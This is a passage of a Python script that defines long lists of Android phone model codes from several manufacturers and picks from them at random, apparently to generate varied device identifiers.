"RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
  infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
  samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
  gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
  rao = random.choice(['CE7', 'CE7j', 'CE9h','KE6', 'KE6j', 'KF6','KE7','LC8','KD6a','LD7', 'LD7j', 'MZ-TECNO LD7','KF6', 'KF6j', 'KF6i', 'KF6k', 'PR651h', 'PR651', 'PR651E', 'KF6m', 'KF6h', 'KF6n'])
  brook=random.choice(['X38','C65023','C6506','C6502','D6503','D6502','Xperia Z2','D6633','D6603','D6643','D6616','D6708','D6563','F5122','F5121','E6633','E5553','E6533','E5333'])
  viv = random.choice(['2022','2023','2024','2027','2005','2005A','2002A','1955A','1962','1945A','1945T','1937','1938','1938CT','1938T','1940','1935','1936A','1933','1934A','1930A','1930T','1927','1928','1928A','1922A','1923A','1921','1921A','1921T','1915','1916','1908','1909','1832A','1832T','1831A','1831T','1824A','1824BA','1817','1818','1814','1815','1816','1727','1730','1718','1719','1723','1724','1725','1601','1606','F1403','2109','2111','2080A','2085A','2072A','2073A','2056A','2054A','2057A','2047','2037','2036','2038'])
  vmo = random.choice(['1902','1906','1901','1904','1938CT','1723','1940','1928A','1909'])
  rmx = random.choice(['RMX1941','RMX1945','RMX1921','RMX1901'])
  poc = random.choice(['SM-M045F', 'SM-M045F/DS','SM-T509','SM-A042F', 'SM-A042F/DS', 'SM-A042M', 'SM-A042M/DS','SM-A047F', 'SM-A047F/DS', 'SM-A047F/DSN','SM-A045F', 'SM-A045F/DS','SM-M136B', 'SM-M136B/DS',])
  gtp = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
  son = random.choice(['H8324', 'H8314', 'SO-05K','XQ-AU51', 'XQ-AU52','XQ-AT51', 'XQ-AT52', 'SOG01','SO-52A', 'XQ-AS52', 'XQ-AS62', 'XQ-AS72', 'A002SO, SOG02'])
  rot = random.choice(['HUAWEIMYA-L03', 'HUAWEIMYA-L23', 'HUAWEIMYA-L02', 'HUAWEIMYA-L22', 'HUAWEIMYA-U29', 'HUAWEIMYA-L13'])
  ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,140))+str(random.randint(111,556))
  cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
  zov = random.choice(['LE2113', 'LE2111', 'LE2110', 'LE2117', 'LE2115','LE2121', 'LE2125', 'LE2123', 'LE2120', 'LE2127','EB2101', 'EB2103','DE2118', 'DE2117','DN2101', 'DN2103','MT2110', 'MT2111'])
  rmx = random.choice(['RMX1603','RMX1801','RMX1805','RMX1807','RMX1809','RMX1811','RMX1821','RMX1825','RMX1827','RMX1831','RMX1833','RMX1851','RMX1901','RMX1903','RMX1911','RMX1919','RMX1921','RMX1925','RMX1931','RMX1941','RMX1945','RMX1971','RMX1991','RMX1992','RMX1993','RMX2001','RMX2002','RMX2002','RMX2002','RMX2020','RMX2020','RMX2021','RMX2025','RMX2027','RMX2027','RMX2030','RMX2032','RMX2040','RMX2040','RMX2050','RMX2051','RMX2061','RMX2063','RMX2071','RMX2072','RMX2075','RMX2076','RMX2081','RMX2083','RMX2085','RMX2086','RMX2101','RMX2103','RMX2111','RMX2111','RMX2117','RMX2121','RMX2142','RMX2144','RMX2151','RMX2155','RMX2156','RMX2161','RMX2163','RMX2170','RMX2176','RMX2180','RMX2185','RMX2189','RMX2193','RMX2195','RMX2202','RMX3031','RMX3061','RMX3063','RMX3081','RMX3085','RMX3092','RMX3171','RMX3191','RMX3193','RMX3195','RMX3197','RMX3201','RMX3231','RMX3241','RMX3242'])
  net = random.choice(['281','282','283','284','285','286','287','288','289','290','291','292','293','382','383','370','394','301','310','311','319','350','378','360','344'])          
  noti = random.choice(['9','10','11','12'])
  mmn = random.choice(['LM-V510N','SM-G970F','SM-A107M','OnePlus BE2015','OnePlus BE2025','OnePlus BE2028','HUAWEI MAR-LX1M','Pixel 3','SM-G996U','SM-G980F','SM-G960U','HUAWEI MAR-LX1A','CP3503L','Coolpad 2039','SM-A025G','SM-J610FN','LG-D802','LG L40','LMK200Z', 'LMK200E', 'LMK200B', 'LM-K200'])
  hwi = random.choice(['YAL-L21','ELE-L04','LYA-L29','ELE-L29','VOG-L09','MAR-LX1B','HLK-AL00','JNY-LX2','MAR-LX3A'])
  gts = random.choice(['AD9','AD8','LG7n','LG8n','LG6n','KG5p','CI7n','CI8', 'CI8n','CI6n','CH6i'])
  tco = random.choice(['RB8S','KC8S','KC6','KC2','CC7','CB7'])
  bio = random.choice(['SM-G6100', 'SM-G610L', 'SM-G610K','SM-G615F', 'SM-G615FU','SM-J730G', 'SM-J730GM','SM-G9298','SM-G615F, SM-G615FU','SM-C7010', 'SM-C701F', 'SM-C7018','SM-J710FN','SM-A520F', 'SM-A520F', 'SM-A520K', 'SM-A520L', 'SM-A520S', 'SM-A520W','SM-A720F', 'SM-A720S','SM-C5010', 'SM-C5018','SM-C9000', 'SM-C900F', 'SM-C9008', 'SM-C900Y','SM-A8100', 'SM-A810F', 'SM-A810F', 'SM-A810YZ', 'SM-A810S','SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M','SM-J105F', 'SM-j105H', 'SM-J105H', 'SM-J105B', 'SM-J105Y', 'SM-J105M','SM-G388F', 'R3','SM-J106F', 'SM-J106B', 'SM-J106H', 'SM-J106M','SM-J701F', 'SM-J701F', 'SM-J701M', 'SM-J701MT','SO-02H', 'E5823', 'E5803','SM-J720F', 'SM-J720F/DS', 'SM-J720M', 'SM-J720M/DS','X00ID', 'X00IS', 'X00HDA', 'ZC554KL','XT1766', 'XT1763','G3116', 'G3121', 'G3112', 'G3123', 'G3125','SM-A605FN', 'SM-A605G', 'SM-A605F', 'SM-A605GN', 'SM-A6050', 'SM-A605K', 'SM-A605X', 'SM-A6058','SM-A750F', 'SM-A750FN', 'SM-A750G', 'SM-A750GN', 'SM-A750C', 'SM-A750X', 'SM-A750N','SM-G885F', 'SM-G8850', 'SM-G885Y', 'SM-G885S', 'SM-G8858','SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M','SM-J105F', 'SM-j105H', 'SM-J105H', 'SM-J105B', 'SM-J105Y', 'SM-J105M','SM-G388F', 'R3','SM-J106F', 'SM-J106B', 'SM-J106H', 'SM-J106M','SM-J250F', 'SM-J250G', 'SM-J250F', 'SM-J250M', 'SM-J250Y','SM-A260F', 'SM-A260G','SM-G532F','SM-G532G', 'SM-G532M', 'SM-G532G', 'SM-G532F', 'SM-G532MT','MT7-TL00', 'MT7-L09', 'MT7-TL10', 'MT7-CL00', 'MT7-UL00','PRA-TL10', 'PRA-TL20', 'PRA-LA1', 'PRA-LX1', 'PRA-LX2', 'TAG-L21', 'PRA-AL00X', 'TAG-L32', 'PRA-LX3', 'PRA-AL00','EVA-L09', 'EVA-L19', 'EVA-L29', 'EVA-AL10', 'EVA-TL00', 'EVA-AL00', 'EVA-DL00','SLA-L02', 'SLA-L22', 'SLA-L03', 'SLA-L23','WAS-LX1', 'WAS-LX2', 'WAS-LX3', 'WAS-LX1A', 'WAS-LX2J', 'WAS-L03T', 'WAS-AL00', 'WAS-TL10','POT-LX1', 'POT-LX1AF', 'POT-LX2J', 'POT-LX1RUA', 'POT-LX3','HMA-L09', 'HMA-LX9', 'HMA-L29', 'HMA-AL00', 'HMA-TL00','LIO-L09', 'LIO-L29', 'LIO-AL00', 'LIO-TL00','MYA-L03', 'MYA-L23', 'MYA-L02, MYA-L22', 'MYA-U29', 'MYA-L13','DUB-LX1', 'DUB-LX3','DUB-LX1'])
  mui = random.choice(['M2004J19G', 'M2004J19C'])
  red = random.choice(['M1803E6G', 'M1803E6H', 'M1803E6I','M1803E7SG', 'M1803E7SH','M1804C3DG', 'M1804C3DH', 'M1804C3DI','M1806E7TG', 'M1806E7TH', 'M1806E7TI','M2004J19G', 'M2004J19C'])
  bik = random.choice(['X017DA','X018D','A009','X00LD','X015D','Z01KS','Z01MDA','ASUS_X00KD','ASUS_A002A','ASUS_X013'])
  inf = random.choice(['X682B', 'X682C','X680B','X688B'])
  inform = random.choice(['PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
